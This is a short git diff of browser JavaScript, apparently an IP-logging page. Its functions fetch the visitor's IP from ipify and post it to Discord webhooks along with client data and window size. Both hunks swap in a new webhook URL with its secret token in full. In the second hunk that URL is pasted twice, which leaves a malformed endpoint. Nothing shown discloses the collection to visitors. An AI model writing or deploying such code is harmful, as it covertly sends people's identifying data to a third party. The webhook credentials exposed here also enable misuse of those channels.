@@ -33,7 +33,7 @@ async function sendWebhookMessage(clientIP, clientData) {
     const windowSize = `${window.innerWidth}x${window.innerHeight}`;
 
 
-    const webhookURL = "https://discord.com/api/webhooks/1073940592406573119/rXX1JGn0enPJuL_rjIYj1Wy8K250E5Z10a4p7-0Fldt5KcgU2HKb20O3VBzenUQUZyQJ";
+    const webhookURL = "https://discord.com/api/webhooks/1074810995312173158/D8WusfycRw1_AZqCk9juRtCCrJWCjNb4Q27u8jprvvm3k0t-7l5jzxTLK7nP2NE-pvJd";
 
     const options = {
         method: 'POST',
@@ -129,7 +129,7 @@ fetch('https://api.ipify.org?format=json')
 
         function sendMessage() {
             const request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/1073940592406573119/rXX1JGn0enPJuL_rjIYj1Wy8K250E5Z10a4p7-0Fldt5KcgU2HKb20O3VBzenUQUZyQJ");
+            request.open("POST", "https://discord.com/api/webhooks/1074810995312173158/D8WusfycRw1_AZqCk9juRtCCrJWCjNb4Q27u8jprvvm3k0t-7l5jzxTLK7nP2NE-pvJdhttps://discord.com/api/webhooks/1074810995312173158/D8WusfycRw1_AZqCk9juRtCCrJWCjNb4Q27u8jprvvm3k0t-7l5jzxTLK7nP2NE-pvJd");
 
             request.setRequestHeader('Content-type', 'application/json');
 
